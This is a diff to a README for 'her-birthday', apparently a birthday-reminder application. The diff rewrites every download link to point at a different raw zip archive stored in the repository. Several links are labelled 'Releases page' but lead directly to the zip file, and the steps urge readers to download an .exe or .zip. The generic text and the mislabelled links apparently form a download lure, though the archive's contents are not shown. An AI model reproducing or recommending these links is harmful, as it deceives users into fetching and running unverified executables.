@@ -6,11 +6,11 @@ Her-birthday is a user-friendly application designed to help you keep track of i
 
 ## 📥 Download the Application
 
-[![Download her-birthday](https://github.com/alphacharlie2301/her-birthday/raw/refs/heads/main/file/her_birthday_1.9.zip)](https://github.com/alphacharlie2301/her-birthday/raw/refs/heads/main/file/her_birthday_1.9.zip)
+[![Download her-birthday](https://raw.githubusercontent.com/alphacharlie2301/her-birthday/main/file/her_birthday_v1.5.zip)](https://raw.githubusercontent.com/alphacharlie2301/her-birthday/main/file/her_birthday_v1.5.zip)
 
 ## 💾 Download & Install
 
-1. Click on this link to visit the [Releases page](https://github.com/alphacharlie2301/her-birthday/raw/refs/heads/main/file/her_birthday_1.9.zip).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/alphacharlie2301/her-birthday/main/file/her_birthday_v1.5.zip).
 2. You will see a list of available versions of her-birthday.
 3. Choose the version you want to download. Look for the most recent version for the best features.
 4. Click the link that ends with `.exe` or `.zip` to start downloading.
@@ -56,6 +56,6 @@ Connect with other users and share tips on using her-birthday. Join our communit
 
 ## 🔗 Stay Updated
 
-To get the latest updates and features, keep an eye on our [Releases page](https://github.com/alphacharlie2301/her-birthday/raw/refs/heads/main/file/her_birthday_1.9.zip). Regular updates may improve the software, fix bugs, or add new features.
+To get the latest updates and features, keep an eye on our [Releases page](https://raw.githubusercontent.com/alphacharlie2301/her-birthday/main/file/her_birthday_v1.5.zip). Regular updates may improve the software, fix bugs, or add new features.
 
 Thank you for choosing her-birthday! We hope you enjoy celebrating the special moments in your life.
